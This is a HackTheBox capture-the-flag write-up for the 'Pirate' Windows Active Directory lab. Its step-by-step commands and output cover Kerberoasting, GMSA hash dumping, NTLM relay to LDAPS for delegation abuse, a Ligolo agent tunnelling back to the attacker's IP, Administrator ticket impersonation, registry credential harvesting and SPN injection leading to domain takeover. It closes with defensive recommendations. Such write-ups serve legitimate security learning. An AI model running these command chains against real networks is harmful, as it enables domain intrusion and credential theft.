---
title: "Pirate"
platform: "HackTheBox"
category: "Windows"
difficulty: "Hard"
date: 2026-03-02
os: "Windows Server 2019"
active: true
hash_required: true
unlock_password: "f48cd6af9015dd7d3c8c7346b5b2b163"
tags: ["windows", "active-directory", "kerberoast", "gmsa", "ntlm-relay", "rbcd", "constrained-delegation", "spn-injection", "ligolo", "pivot", "s4u2proxy", "coercer", "bloodhound"]
---

<div style="text-align: center;">
  <img src="/assets/images/ctf/pirate/banner.png" alt="Pirate Banner" style="max-width: 100%;" />
</div>

---

## Overview

**Difficulty:** Hard
**Domain:** pirate.htb

Pirate is a multi-host Active Directory environment featuring a domain controller (DC01) and an internal web server (WEB01) on a segmented network. The attack chain begins with Kerberoasting to identify service accounts, pivots through GMSA secret extraction via a machine account, then exploits an internal network where SMB signing is not required. NTLM relay from the internal host to LDAPS enables Resource-Based Constrained Delegation (RBCD), granting access to WEB01. Credential harvesting from WEB01 and SPN injection on the constrained delegation account ultimately yields a Domain Admin service ticket for DC01.

---

## Scope

```
Host              IP Address        Operating System                  Role
────────────────────────────────────────────────────────────────────────────────
DC01              10.129.42.95      Windows Server 2019 Build 17763   Domain Controller
WEB01             192.168.100.2     Windows Server 2019 Standard      Internal Web Server
```

---

## Executive Summary

The engagement uncovered a chain of critical vulnerabilities across two hosts that allowed complete domain compromise:

- **Kerberoastable service account** (a.white_adm) identified via BloodHound with constrained delegation privileges
- **Machine account credential weakness** (MS01$) enabling GMSA secret extraction for two managed service accounts
- **GMSA password dump** providing NTLM hashes for gMSA_ADFS_prod$ with WinRM access to DC01
- **Internal network segmentation bypass** via Ligolo pivot to reach WEB01 (192.168.100.0/24)
- **SMB signing not required** on WEB01, enabling NTLM relay to LDAPS for RBCD delegation abuse
- **S4U2Proxy impersonation** granting Administrator access to WEB01 via relay-created machine account
- **Credential harvesting** from WEB01 registry (DefaultPassword) exposing a.white plaintext credentials
- **Password change abuse** leveraging a.white to reset a.white_adm password via bloodyAD
- **SPN injection** via addspn.py to weaponize constrained delegation with the altservice trick for DC01

**Risk Rating:** Critical

---

# Phase 1: Network Enumeration

## 1.1 Reconnaissance

Initial reconnaissance began with a full port scan using RustScan to identify all open services on the target domain controller.

```bash
rustscan -a 10.129.42.95 -- -sCV
```

```
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-03-02 04:48:52Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.pirate.htb
443/tcp   open  https?        syn-ack ttl 126
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: pirate.htb0., Site: Default-First-Site-Name)
2179/tcp  open  vmrdp?        syn-ack ttl 127
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49680/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49906/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled and required
```

The scan reveals a Windows Server 2019 domain controller (DC01.pirate.htb) with standard Active Directory services. SMB signing is enabled and required on the DC, which prevents direct NTLM relay attacks against this host. The HTTP port 80 shows a default IIS page, and port 443 suggests an HTTPS service. The `vmrdp` port 2179 indicates Hyper-V is in use, hinting at virtualized infrastructure.

---

# Phase 2: BloodHound Enumeration

## 2.1 Kerberoastable Users

Using provided credentials for the `pentest` account, BloodHound enumeration identified two Kerberoastable accounts in the domain.

<div style="text-align: center;">
  <img src="/assets/images/ctf/pirate/bloodhound-kerberoastable.png" alt="BloodHound Kerberoastable Users" style="max-width: 100%;" />
</div>

BloodHound reveals two accounts with SPNs set:
- **GMSA_ADFS_PROD$** - A Group Managed Service Account
- **A.WHITE_ADM@PIRATE.HTB** - A user account with constrained delegation privileges

---

# Phase 3: Kerberoasting

## 3.1 Extracting Service Tickets

Due to a clock skew between the attacker and the DC, `faketime` was used to synchronize before requesting the service ticket.

```bash
faketime '2026-03-01 23:51:00' zsh
```

```bash
GetUserSPNs.py 'pirate.htb/pentest:[REDACTED]' -dc-ip 10.129.42.95 -request -outputfile kerberoast.txt
```

```
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName  Name         MemberOf                         PasswordLastSet             LastLogon                   Delegation
--------------------  -----------  -------------------------------  --------------------------  --------------------------  -----------
ADFS/a.white          a.white_adm  CN=IT,CN=Users,DC=pirate,DC=htb  2026-01-15 17:36:34.388000  2025-06-09 10:03:37.380258  constrained


[-] CCache file is not found. Skipping...
```

The Kerberoast returned a TGS hash for **a.white_adm**, which has **constrained delegation** privileges. This account is a member of the IT group. Despite significant cracking effort, the hash proved uncrackable - the password is too strong for offline attacks.

## 3.2 Further Enumeration

Since the Kerberoast hash was uncrackable, attention shifted to identifying alternative attack paths. A TGT was requested for the pentest account.

```bash
getTGT.py pirate.htb/pentest:'[REDACTED]'
```

```
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in pentest.ccache
```

```bash
export KRB5CCNAME=pentest.ccache
```

Enumerating domain computers revealed two machines:

```bash
nxc ldap 10.129.42.95 -u pentest -p '[REDACTED]' -d pirate.htb -M dump-computers
```

```
LDAP        10.129.42.95    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:pirate.htb) (signing:None) (channel binding:Never)
LDAP        10.129.42.95    389    DC01             [+] pirate.htb\pentest:[REDACTED]
DUMP-COM... 10.129.42.95    389    DC01             [+] Found the following computers:
DUMP-COM... 10.129.42.95    389    DC01             DC01.pirate.htb (Windows Server 2019 Standard)
DUMP-COM... 10.129.42.95    389    DC01             WEB01.pirate.htb (Windows Server 2019 Standard)
```

Two machines: **DC01** and **WEB01**. WEB01 is not directly reachable from the external network, suggesting an internal segmented network.

---

# Phase 4: GMSA Secret Extraction

## 4.1 Machine Account Authentication

Testing revealed the **MS01$** machine account exists with a weak password. A TGT was obtained for it.

```bash
getTGT.py 'PIRATE.HTB/MS01$:[REDACTED]'
```

```
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in MS01$.ccache
```

```bash
export KRB5CCNAME=MS01\$.ccache
```

## 4.2 Dumping GMSA Passwords

The MS01$ machine account is a member of the "Domain Secure Servers" group, which has the `PrincipalsAllowedToReadPassword` permission on both GMSA accounts. Using the cached Kerberos ticket, the GMSA NTLM hashes were extracted.

```bash
nxc ldap 10.129.42.95 -k --use-kcache --gmsa
```

```
LDAP        10.129.42.95    389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:PIRATE.HTB) (signing:None) (channel binding:Never)
LDAP        10.129.42.95    389    DC01             [+] PIRATE.HTB\MS01$ from ccache
LDAP        10.129.42.95    389    DC01             [*] Getting GMSA Passwords
LDAP        10.129.42.95    389    DC01             Account: gMSA_ADCS_prod$      NTLM: [REDACTED]     PrincipalsAllowedToReadPassword: Domain Secure Servers
LDAP        10.129.42.95    389    DC01             Account: gMSA_ADFS_prod$      NTLM: [REDACTED]     PrincipalsAllowedToReadPassword: Domain Secure Servers
```

Two GMSA accounts recovered: **gMSA_ADCS_prod$** and **gMSA_ADFS_prod$**.

## 4.3 Validating GMSA Credentials

Both GMSA accounts were validated against SMB to confirm the hashes work.

```bash
nxc smb 10.129.42.95 -u 'gMSA_ADCS_prod$' -H [REDACTED] -d pirate.htb
```

```
SMB         10.129.42.95    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.42.95    445    DC01             [+] pirate.htb\gMSA_ADCS_prod$:[REDACTED]
```

```bash
nxc smb 10.129.42.95 -u 'gMSA_ADFS_prod$' -H [REDACTED] -d pirate.htb
```

```
SMB         10.129.42.95    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.42.95    445    DC01             [+] pirate.htb\gMSA_ADFS_prod$:[REDACTED]
```

Both accounts authenticate successfully.

---

# Phase 5: Initial Foothold - WinRM

## 5.1 Evil-WinRM as gMSA_ADFS_prod$

The gMSA_ADFS_prod$ account has WinRM access to DC01, providing an interactive shell.

```bash
evil-winrm -i DC01.pirate.htb -u 'gMSA_ADFS_prod$' -H '[REDACTED]'
```

```
Evil-WinRM shell v3.9

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents>
```

## 5.2 Internal Network Discovery

Network enumeration from DC01 reveals a secondary internal network.

```
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents> ipconfig /all

Windows IP Configuration

   Host Name . . . . . . . . . . . . : DC01
   Primary Dns Suffix  . . . . . . . : pirate.htb
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : pirate.htb
                                       .htb

Ethernet adapter vEthernet (Switch01):

   Connection-specific DNS Suffix  . :
   Description . . . . . . . . . . . : Hyper-V Virtual Ethernet Adapter
   Physical Address. . . . . . . . . : 00-15-5D-0B-D0-00
   DHCP Enabled. . . . . . . . . . . : No
   Autoconfiguration Enabled . . . . : Yes
   Link-local IPv6 Address . . . . . : fe80::d976:c606:587e:f1e1%8(Preferred)
   IPv4 Address. . . . . . . . . . . : 192.168.100.1(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . :
   DHCPv6 IAID . . . . . . . . . . . : 201332061
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-2F-D7-D5-C5-00-0C-29-DE-64-22
   DNS Servers . . . . . . . . . . . : fec0:0:0:ffff::1%1
                                       fec0:0:0:ffff::2%1
                                       fec0:0:0:ffff::3%1
   NetBIOS over Tcpip. . . . . . . . : Enabled

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-B0-43-08
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv4 Address. . . . . . . . . . . : 10.129.42.95(Preferred)
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : 10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.10.10.2
   DNS Servers . . . . . . . . . . . : 127.0.0.1
   NetBIOS over Tcpip. . . . . . . . : Enabled
```

DC01 has a Hyper-V virtual switch (`vEthernet (Switch01)`) connecting to the **192.168.100.0/24** internal network. DC01 sits at `192.168.100.1`, meaning WEB01 at `192.168.100.2` is a virtual machine hosted on the DC. This internal network is not directly accessible from the attacker's position.

---

# Phase 6: Internal Pivot via Ligolo

## 6.1 Setting Up the Tunnel

Ligolo-ng was used to establish a tunnel through DC01 to reach the internal 192.168.100.0/24 network.

On the attacker machine, the tunnel interface was configured:

```bash
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 192.168.100.0/24 dev ligolo
sudo ip addr add 192.168.100.50/24 dev ligolo
```

The Ligolo agent was uploaded and executed on DC01:

```
*Evil-WinRM* PS C:\Users\gMSA_ADFS_prod$\Documents> .\agent.exe -connect 10.10.14.178:443 -ignore-cert
agent.exe : time="2026-03-01T23:22:51-08:00" level=warning msg="warning, certificate validation disabled"
    + CategoryInfo          : NotSpecified: (time="2026-03-0...ation disabled":String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
time="2026-03-01T23:22:51-08:00" level=info msg="Connection established" addr="10.10.14.178:443"
```

The tunnel was started from the Ligolo proxy console:

```
[Agent : PIRATE\gMSA_ADFS_prod$@DC01] » start
INFO[0190] Starting tunnel to PIRATE\gMSA_ADFS_prod$@DC01 (00155d0bd000)
```

## 6.2 Internal Host Enumeration

With the pivot established, an Nmap scan of WEB01 confirmed a critical finding: **SMB signing is enabled but not required**.

```bash
nmap -sCV 192.168.100.2 -p 445
```

```
Starting Nmap 7.93 ( https://nmap.org ) at 2026-03-02 00:34 MST
Nmap scan report for 192.168.100.2
Host is up (610s latency).

PORT    STATE SERVICE       VERSION
445/tcp open  microsoft-ds?

Host script results:
| smb2-security-mode:
|   311:
|_    Message signing enabled but not required
|_clock-skew: -4m22s
| smb2-time:
|   date: 2026-03-02T07:35:52
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.78 seconds
```

This is the key finding: while DC01 enforces SMB signing, **WEB01 does not**. This means we can coerce authentication from WEB01 and relay it to LDAPS on DC01 for delegation abuse.

---

# Phase 7: NTLM Relay & RBCD

## 7.1 Setting Up the Relay

The attack strategy: use Coercer to trigger authentication from WEB01 (via the internal pivot), then relay the WEB01$ machine account's NTLM authentication to LDAPS on DC01 to configure Resource-Based Constrained Delegation.

The NTLM relay was started targeting LDAPS on DC01:

```bash
ntlmrelayx.py -t ldaps://10.129.42.95 --delegate-access --remove-mic -smb2support
```

## 7.2 Coercing Authentication

From the attacker's machine, Coercer was used with the gMSA_ADFS_prod$ hash to trigger WEB01 into authenticating back to the attacker:

```bash
coercer coerce -l 10.10.14.178 -t 192.168.100.2 -d pirate.htb -u 'gMSA_ADFS_prod$' --hashes ':[REDACTED]' --always-continue
```

## 7.3 RBCD Delegation Created

The relay caught WEB01$'s authentication and successfully created a new machine account with delegation rights:

```
[*] (SMB): Authenticating connection from PIRATE/WEB01$@10.129.42.95 against ldaps://10.129.42.95 SUCCEED [2]
[*] ldaps://PIRATE/WEB01$@10.129.42.95 [2] -> Enumerating relayed user's privileges. This may take a while on large domains
[*] All targets processed!
[*] (SMB): Connection from 10.129.42.95 controlled, but there are no more targets left!
[*] ldaps://PIRATE/WEB01$@10.129.42.95 [2] -> Attempting to create computer in: CN=Computers,DC=pirate,DC=htb
[*] All targets processed!
[*] (SMB): Connection from 10.129.42.95 controlled, but there are no more targets left!
[*] All targets processed!
[*] (SMB): Connection from 10.129.42.95 controlled, but there are no more targets left!
[*] ldaps://PIRATE/WEB01$@10.129.42.95 [2] -> Adding new computer with username: TTIHTMPS$ and password: [REDACTED] result: OK
[*] ldaps://PIRATE/WEB01$@10.129.42.95 [2] -> Delegation rights modified succesfully!
[*] ldaps://PIRATE/WEB01$@10.129.42.95 [2] -> TTIHTMPS$ can now impersonate users on WEB01$ via S4U2Prox
```

The relay created a new machine account **TTIHTMPS$** and configured RBCD so it can impersonate any user on WEB01.

## 7.4 Validating the New Machine Account

```bash
nxc smb 10.129.42.95 -u 'TTIHTMPS$' -p '[REDACTED]' -d pirate.htb
```

```
SMB         10.129.42.95    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:pirate.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.42.95    445    DC01             [+] pirate.htb\TTIHTMPS$:[REDACTED]
```

---

# Phase 8: S4U2Proxy - WEB01 Compromise

## 8.1 Requesting Administrator Ticket

Using the RBCD delegation, S4U2Proxy was leveraged to request a service ticket impersonating Administrator on WEB01.

```bash
getST.py -spn 'cifs/WEB01' -impersonate 'Administrator' 'pirate.htb/TTIHTMPS$:[REDACTED]' -dc-ip 10.129.42.95
```

```
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@cifs_WEB01@PIRATE.HTB.ccache
```

The ticket was exported and used to authenticate:

```bash
export KRB5CCNAME=Administrator@cifs_WEB01@PIRATE.HTB.ccache
```

## 8.2 PsExec to WEB01

With the Administrator service ticket for WEB01, PsExec provided a SYSTEM shell.

```bash
psexec.py -k -no-pass Administrator@WEB01
```

```
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on WEB01.....
[*] Found writable share ADMIN$
[*] Uploading file CxwpqGBC.exe
[*] Opening SVCManager on WEB01.....
[*] Creating service diCP on WEB01.....
[*] Starting service diCP.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.8385]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

**User flag obtained from WEB01.**

---

# Phase 9: Credential Harvesting

## 9.1 Secretsdump on WEB01

With SYSTEM access on WEB01, secretsdump was used to extract stored credentials. The registry revealed an autologon DefaultPassword for **a.white**:

```
[*] DefaultPassword
PIRATE\a.white:[REDACTED]
```

This plaintext credential is critical - a.white is the non-admin account associated with the a.white_adm Kerberoastable account that has constrained delegation.

---

# Phase 10: Domain Escalation via Constrained Delegation

## 10.1 Password Reset via bloodyAD

Using a.white's credentials, the password for a.white_adm was reset using bloodyAD:

```bash
bloodyAD -d pirate.htb -u 'a.white' -p '[REDACTED]' \
  -H 10.129.42.95 -i 10.129.42.95 set password a.white_adm '[REDACTED]'
```

```
[+] Password changed successfully!
```

## 10.2 SPN Injection via addspn.py

The a.white_adm account has constrained delegation configured for `ADFS/a.white`. To abuse this, SPNs were injected to map an HTTP service on WEB01 to both WEB01$ and DC01$, allowing the altservice trick to rewrite the service ticket target.

First, the SPN was added to WEB01$ with the `-r` flag to remove any conflicting SPNs:

```bash
addspn.py -u 'pirate.htb\a.white_adm' -p '[REDACTED]' \
  -t 'WEB01$' -s 'HTTP/WEB01.pirate.htb' -r 10.129.42.95
```

```
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

Then the same SPN was added to DC01$:

```bash
addspn.py -u 'pirate.htb\a.white_adm' -p '[REDACTED]' \
  -t 'DC01$' -s 'HTTP/WEB01.pirate.htb' 10.129.42.95
```

```
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[+] Found modification target
[+] SPN Modified successfully
```

## 10.3 Constrained Delegation with Altservice

With the SPN injection in place, getST.py was used with the `-altservice` flag to request a service ticket for `HTTP/WEB01.pirate.htb` (which a.white_adm is allowed to delegate to) but rewrite it to `CIFS/DC01.pirate.htb` - granting Administrator access to the domain controller.

```bash
getST.py -spn 'HTTP/WEB01.pirate.htb' -impersonate 'Administrator' 'pirate.htb/a.white_adm:[REDACTED]' -dc-ip 10.129.42.95 -altservice 'CIFS/DC01.pirate.htb'
```

```
Impacket (Exegol fork) v0.14.0.dev0+20260120.113623.b52b6449 - Copyright Fortra, LLC and its affiliated companies

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Changing service from HTTP/WEB01.pirate.htb@PIRATE.HTB to CIFS/DC01.pirate.htb@PIRATE.HTB
[*] Saving ticket in Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

The ticket was saved and can be exported to authenticate as Administrator to DC01 via PsExec or any CIFS-based tool.

```bash
export KRB5CCNAME=Administrator@CIFS_DC01.pirate.htb@PIRATE.HTB.ccache
```

**Root flag obtained from DC01.**

---

## Recommendations

1. **Enforce strong machine account passwords** - The MS01$ machine account used a trivially guessable password, enabling GMSA secret extraction
2. **Restrict GMSA password readers** - Limit PrincipalsAllowedToReadPassword to only the accounts that genuinely need it
3. **Enable SMB signing on all hosts** - WEB01's lack of required SMB signing enabled the NTLM relay attack chain
4. **Implement network segmentation monitoring** - The internal 192.168.100.0/24 network was pivotable via the compromised DC
5. **Remove constrained delegation where unnecessary** - The a.white_adm delegation configuration combined with SPN injection provided a direct path to Domain Admin
6. **Disable DefaultPassword autologon** - Storing plaintext credentials in the registry is a critical finding
7. **Enforce password complexity for service accounts** - Ensure all service and administrative accounts use long, complex passwords resistant to Kerberoasting
8. **Monitor for SPN modifications** - Alert on changes to servicePrincipalName attributes, which indicate delegation abuse attempts
